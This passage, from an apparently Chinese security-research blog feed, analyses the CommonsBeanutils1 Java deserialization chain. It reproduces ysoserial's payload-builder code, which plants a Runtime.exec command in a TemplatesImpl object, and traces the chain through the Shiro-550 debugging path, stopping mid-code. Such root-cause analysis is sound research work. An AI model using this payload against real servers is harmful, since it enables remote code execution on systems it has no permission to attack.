<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>安全研究 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/</link><description>Recent content in 安全研究 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Fri, 12 Jan 2024 14:32:08 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/index.xml" rel="self" type="application/rss+xml"/><item><title>CommonsBeanutils1 Chain</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</link><pubDate>Fri, 12 Jan 2024 14:32:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</guid><description>&lt;h3 id="概述">概述&lt;/h3>
&lt;p>在ysoserial中实现了&lt;code>CommonsBeanutils1&lt;/code>反序列化链，可以利用这个链执行代码。&lt;/p>
&lt;h3 id="细节">细节&lt;/h3>
&lt;p>在ysoserial中实现&lt;code>CommonsBeanutils1&lt;/code>代码如下，首先&lt;code>new BeanComparator/PriorityQueue&lt;/code>对象，在&lt;code>PriorityQueue&lt;/code>对象内添加两个int对象，而后通过反射修改property字段存储的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CommonsBeanutils1&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> ObjectPayload&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">final&lt;/span> String command&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> Object templates &lt;span style="color:#f92672">=&lt;/span> Gadgets&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>command&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// mock method name until armed
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> BeanComparator comparator &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> BeanComparator&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;lowestSetBit&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// create queue with numbers and basic comparator
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> PriorityQueue&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> queue &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> PriorityQueue&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;(&lt;/span>2&lt;span style="color:#f92672">,&lt;/span> comparator&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;span style="color:#75715e">&lt;/span> queue&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> BigInteger&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
queue&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> BigInteger&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#75715e">// switch method called by comparator
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Reflections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>comparator&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// switch contents of queue
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> Object&lt;span style="color:#f92672">[]&lt;/span> queueArray &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Object&lt;span style="color:#f92672">[])&lt;/span> Reflections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>queue&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
queueArray&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> templates&lt;span style="color:#f92672">;&lt;/span>
queueArray&lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> templates&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> queue&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Object &lt;span style="color:#a6e22e">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String command&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> Boolean&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">parseBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;properXalan&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">?&lt;/span> createTemplatesImpl&lt;span style="color:#f92672">(&lt;/span>command&lt;span style="color:#f92672">,&lt;/span> Class&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.apache.xalan.xsltc.trax.TemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> Class&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> Class&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">:&lt;/span> createTemplatesImpl&lt;span style="color:#f92672">(&lt;/span>command&lt;span style="color:#f92672">,&lt;/span> TemplatesImpl&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> AbstractTranslet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> TransformerFactoryImpl&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> T &lt;span style="color:#a6e22e">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String command&lt;span style="color:#f92672">,&lt;/span> Class&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> tplClass&lt;span style="color:#f92672">,&lt;/span> Class&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> abstTranslet&lt;span style="color:#f92672">,&lt;/span> Class&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> transFactory&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
T templates &lt;span style="color:#f92672">=&lt;/span> tplClass&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
ClassPool pool &lt;span style="color:#f92672">=&lt;/span> ClassPool&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
pool&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">insertClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> ClassClassPath&lt;span style="color:#f92672">(&lt;/span>StubTransletPayload&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
pool&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">insertClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> ClassClassPath&lt;span style="color:#f92672">(&lt;/span>abstTranslet&lt;span style="color:#f92672">));&lt;/span>
CtClass clazz &lt;span style="color:#f92672">=&lt;/span> pool&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>StubTransletPayload&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
String cmd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;java.lang.Runtime.getRuntime().exec(\&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> command&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">replace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;\\\\&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">replace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;\\\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;\&amp;#34;);&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
clazz&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">makeClassInitializer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">insertAfter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>cmd&lt;span style="color:#f92672">);&lt;/span>
clazz&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ysoserial.Pwner&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">nanoTime&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
CtClass superC &lt;span style="color:#f92672">=&lt;/span> pool&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>abstTranslet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
clazz&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setSuperclass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>superC&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> classBytes &lt;span style="color:#f92672">=&lt;/span> clazz&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
Reflections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>templates&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>classBytes&lt;span style="color:#f92672">,&lt;/span> ClassFiles&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">classAsBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Foo&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)});&lt;/span>
Reflections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>templates&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Pwnr&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
Reflections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>templates&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> transFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">newInstance&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> templates&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而后通过反射将PriorityQueue对象存储的两个BigInteger对象改为创建的TemplatesImpl对象。
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/1.png" />&lt;/p>
&lt;p>&lt;strong>根因分析&lt;/strong>
根据前面调试知道，&lt;code>CommonsBeanutils1&lt;/code>序列化&lt;code>PriorityQueue&lt;/code>对象，其中&lt;code>comparator&lt;/code>指定为&lt;code>BeanComparator&lt;/code>，&lt;code>PriorityQueue&lt;/code>内存了两个&lt;code>TemplatesImpl&lt;/code>对象。&lt;/p>
&lt;p>使用
&lt;a href="https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/">shiro 550&lt;/a>环境，发送payload，在调试器中可以看到，首先反序列化&lt;code>PriorityQueue&lt;/code>对象
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/2.png" />&lt;/p>
&lt;p>在readObject断点，可以看到尝试反序列化&lt;code>comparator&lt;/code>，这里是&lt;code>BeanComparator&lt;/code>，并递归反序列化&lt;code>TemplatesImpl&lt;/code>
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/3.png" />&lt;/p>
&lt;p>而后readObject会调用heapify方法，跟进调用最后调用到comparator.compare&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">heapify&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>size &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> 1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">;&lt;/span> i &lt;span style="color:#f92672">&amp;gt;=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span> i&lt;span style="color:#f92672">--)&lt;/span>
siftDown&lt;span style="color:#f92672">(&lt;/span>i&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>E&lt;span style="color:#f92672">)&lt;/span> queue&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">siftDown&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> k&lt;span style="color:#f92672">,&lt;/span> E x&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>comparator &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
siftDownUsingComparator&lt;span style="color:#f92672">(&lt;/span>k&lt;span style="color:#f92672">,&lt;/span> x&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span>
siftDownComparable&lt;span style="color:#f92672">(&lt;/span>k&lt;span style="color:#f92672">,&lt;/span> x&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">siftDownUsingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> k&lt;span style="color:#f92672">,&lt;/span> E x&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> half &lt;span style="color:#f92672">=&lt;/span> size &lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> 1&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>k &lt;span style="color:#f92672">&amp;lt;&lt;/span> half&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> child &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>k &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> 1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> 1&lt;span style="color:#f92672">;&lt;/span>
Object c &lt;span style="color:#f92672">=&lt;/span> queue&lt;span style="color:#f92672">[&lt;/span>child&lt;span style="color:#f92672">];&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> right &lt;span style="color:#f92672">=&lt;/span> child &lt;span style="color:#f92672">+&lt;/span> 1&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>right &lt;span style="color:#f92672">&amp;lt;&lt;/span> size &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
comparator&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">compare&lt;/span>&lt;span style="color:#f92672">((&lt;/span>E&lt;span style="color:#f92672">)&lt;/span> c&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>E&lt;span style="color:#f92672">)&lt;/span> queue&lt;span style="color:#f92672">[&lt;/span>right&lt;span style="color:#f92672">])&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span>
c &lt;span style="color:#f92672">=&lt;/span> queue&lt;span style="color:#f92672">[&lt;/span>child &lt;span style="color:#f92672">=&lt;/span> right&lt;span style="color:#f92672">];&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>comparator&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">compare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>x&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">(&lt;/span>E&lt;span style="color:#f92672">)&lt;/span> c&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
queue&lt;span style="color:#f92672">[&lt;/span>k&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> c&lt;span style="color:#f92672">;&lt;/span>
k &lt;span style="color:#f92672">=&lt;/span> child&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
queue&lt;span style="color:#f92672">[&lt;/span>k&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> x&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>BeanComparator实现了Comparator接口，compare方法代码如下，其会调用getProperty方法，前面在ysoserial中property被设置为outputProperities&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">compare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>T o1&lt;span style="color:#f92672">,&lt;/span> T o2&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">property&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>o1&lt;span style="color:#f92672">,&lt;/span> o2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Object value1 &lt;span style="color:#f92672">=&lt;/span> PropertyUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>o1&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
Object value2 &lt;span style="color:#f92672">=&lt;/span> PropertyUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>o2&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>value1&lt;span style="color:#f92672">,&lt;/span> value2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>IllegalAccessException var5&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RuntimeException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;IllegalAccessException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> var5&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InvocationTargetException var6&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RuntimeException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;InvocationTargetException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> var6&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>NoSuchMethodException var7&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> RuntimeException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;NoSuchMethodException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> var7&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/4.png" />&lt;/p>
&lt;p>跟进getProperty方法内，其中bean为&lt;code>TemplatesImpl&lt;/code>对象，会进入&lt;code>bean = this.getSimpleProperty(bean, name);&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Object &lt;span style="color:#a6e22e">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Object bean&lt;span style="color:#f92672">,&lt;/span> String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException&lt;span style="color:#f92672">,&lt;/span> InvocationTargetException&lt;span style="color:#f92672">,&lt;/span> NoSuchMethodException &lt;span style="color:#f92672">{&lt;/span>
